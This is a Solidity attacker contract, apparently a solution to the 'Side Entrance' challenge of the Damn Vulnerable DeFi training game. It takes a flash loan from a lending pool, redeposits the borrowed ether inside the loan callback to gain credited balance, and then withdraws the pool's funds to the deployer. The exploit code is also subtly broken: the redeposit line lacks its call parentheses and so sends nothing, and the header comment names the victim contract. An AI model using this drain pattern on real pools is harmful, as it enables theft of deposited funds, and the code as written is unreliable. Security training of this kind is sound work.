// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit(uint256 amount) external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReciever {
    using Address for address payable;

    address private _vulnerableContract;
    address private _attacker;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    constructor(address vulnerableContract) {
        _vulnerableContract = vulnerableContract;
        _attacker = msg.sender;
    }

    function deposit(uint256 amount) public payable {
        ISideEntranceLenderPool(_vulnerableContract).deposit{value: amount};
    }

    function withdraw() external {
        require(msg.sender == _attacker, "don't be too sneaky");
        ISideEntranceLenderPool(_vulnerableContract).withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute(uint256 amount) external {
        require(msg.sender == _vulnerableContract, "don't be too greddy");
        deposit(amount);
    }

    function flashLoan(uint256 amount) external {
        ISideEntranceLenderPool(_vulnerableContract).flashLoan(amount);
    }
}
